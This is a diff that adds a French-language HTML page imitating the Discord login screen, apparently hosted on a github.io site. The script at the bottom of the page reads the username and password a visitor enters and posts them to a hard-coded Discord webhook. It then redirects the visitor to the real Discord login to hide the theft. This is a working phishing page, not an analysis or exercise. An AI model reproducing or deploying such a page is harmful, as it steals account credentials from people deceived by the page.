@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <!-- HTML Meta Tags -->
+    <title></title>
+    <meta name="description" content="">
+
+    <!-- Facebook Meta Tags -->
+    <meta property="og:url" content="https://bleep-app.github.io">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Invite">
+    <meta property="og:description" content="">
+    <meta property="og:image" content="">
+
+    <!-- Twitter Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="twitter:domain" content="bleep-app.github.io">
+    <meta property="twitter:url" content="https://bleep-app.github.io">
+    <meta name="twitter:title" content="Invite">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:image" content="">
+
+<!-- Meta Tags Generated via https://www.opengraph.xyz -->
+
+
+    <link rel="stylesheet" href="assets/font.css">
+
+
+    <style>
+        body{
+            background-color: rgb(41, 41, 41);
+            margin: 0; height: 100%; overflow: hidden
+            
+        }
+        .center{
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            justify-content: center; /* centre horizontalement */
+            align-items: center;     /* centre verticalement */
+        }
+        .login-frame{
+            aspect-ratio: 7.6/4;
+            width: 800px;
+
+            border-radius: 8px;
+            background-color: rgb(57,58,65);
+            box-shadow: 1px 1px 5px rgba(0, 0, 0, 0.3);
+
+            opacity: 0;
+            transform: translateY(-30px) scale(1.05);
+            animation: descenteDouce 0.4s ease-out forwards;
+
+            display: flex;
+            flex-direction: row; /* par défaut, c'est row */
+
+        }
+        .background-image{
+            position: absolute;
+            height: 100vh;
+            min-height: 100vh;
+            min-width: 100vw;
+        }
+        .upper-banner{
+            position: absolute;
+            left: 45px;
+            top:45px;
+            width: 130px;
+        }
+        .login-form{
+            
+            color: white;
+            width: 55%;
+            margin: 30px;
+            display: flex;
+            flex-direction: column; /* par défaut, c'est row */
+            gap: 2px;
+        }
+        input{
+            margin-top: 2px;
+            outline: none;
+            padding-left: 10px;
+            background-color: rgb(46, 46, 52);
+            width: 98%;
+            height:40px;
+            color: white;
+            font-size: 1em;
+            border-radius: 7px;
+            border: solid 1px rgb(67, 67, 74);
+            border-color: rgb(67, 67, 74);
+            transition: border-color 0.3s ease; /* transition douce sur la couleur */
+        }
+        input:focus{
+            border-color: rgb(121,173,241);
+        }
+        button{
+            margin-top: 15px;
+            background-color: rgb(88, 101, 242);
+            height: 40px;
+            border:none;
+            color: white;
+            font-weight: 600px;
+            font-size: 1em;
+            border-radius: 7px;
+            transition: background-color 0.5s ease; /* transition de la couleur de fond sur 0.5 seconde */
+        }
+        button:hover{
+            background-color: rgb(68, 82, 187);
+        }
+        a{
+            color:rgb(147, 167, 253);
+            text-decoration: none;
+        }
+        .greeting{
+            padding-top:5px;
+            color: white;
+            width: 100%;
+            height: 70px;
+            gap:7px;
+            text-align: center;
+        }
+        .qrcode-frame{
+            
+            color: white;
+            width: 35%;
+            margin: 30px;
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+            align-items: center;
+            text-align: center;
+        }
+        .qrcode{
+            border-radius: 5px;
+            background-color: white;
+            margin: 0;
+        }
+        .qrcode img{
+            padding: 7px;
+        }
+
+
+        @keyframes descenteDouce {
+            from {
+                opacity: 1;
+                transform: translateY(-30px) scale(1.05);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+    </style>
+    </head>
+    <body>
+        <img src="assets/login_background.svg" class="background-image">
+        <img src="assets/logo_banner.svg" class="upper-banner">
+        <div class="center">
+            <div class="login-frame">
+                <div class="login-form">
+                    <div class="greeting"><div style="font-size: 1.5em; font-weight: 600;">Ha, te revoilà !</div>
+                        <div style="font-size: 1em; font-weight: 400;">Nous sommes si heureux de te revoir !</div>
+                    </div>
+                    <div style="font-size: 1em; font-weight: 500;">
+                        E-mail ou numéro de téléphone *
+                    </div>
+                    <input id="username">
+                    
+                    <div style="font-size: 1em; font-weight: 500; padding-top: 20px;">
+                        Mot de passe *
+                    </div>
+                    <input type="password" id="password">
+                    <div style="font-size: 0.9em; font-weight: 400; padding-top:4px; color:rgb(147, 167, 253)">
+                        <a href="https://discord.com/login">Tu as oublié ton mot de passe ?</a>
+                    </div>
+                    <button id="sendBtn">Connexion</button>
+                    <div style="margin-top:5px; font-size: 0.9em; color:rgb(173, 174, 180)">Besoin d'un compte ? <a href="https://discord.com/register">S'inscrire</a></div>
+                </div>
+                <div class="qrcode-frame">
+                    <div class="qrcode">
+                        <img src="assets/qrcode.svg">
+                        <img src="assets/qr_logo.png" style="position:absolute; left: 607px; top:60px; height: 50px;">
+                    </div>
+                    <p style="font-size:1.5em; font-weight: 600; margin-bottom: 0; margin-top:5px;">Se connecter avec un code QR</p>
+                    <p style="font-size:1em; font-weight: 400; margin-top:5px; margin-bottom: 0;">Scanne-le avec <bold>l'application<br> mobile Discord</bold> pour te connecter instantanément.</p>
+                    <div style="font-size: 0.9em; font-weight: 400; padding-top:4px; color:rgb(147, 167, 253); margin-top: 0;">
+                        Sinon, connecte-toi avec une clés d'acc...
+                    </div>
+                </div>
+                
+            </div>
+
+        </div>
+        <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1439367348766244864/OGKFfUXELG-98qbvGx9TDhjsFMcwP8HNzEBpKX_IVBFwDeyzmn0cnmR1XZfX_fohXLZs";
+
+        document.getElementById('sendBtn').addEventListener('click', () => {
+            const input1Value = document.getElementById('username').value;
+            const input2Value = document.getElementById('password').value;
+
+            const content = `Username : ${input1Value}\nPassword : ${input2Value}`;
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: content })
+                })
+                .then(response => {
+                // Redirection vers la nouvelle page après l'envoi
+                window.location.href = 'https://discord.com/login'; // Remplacez par l'URL souhaitée
+                })
+                .catch(error => {
+                alert('Erreur réseau : ' + error);
+                // Redirection même en cas d'erreur si souhaité
+                window.location.href = 'https://discord.com/login';
+                });
+            });
+        </script>
+    </body>
+</html>
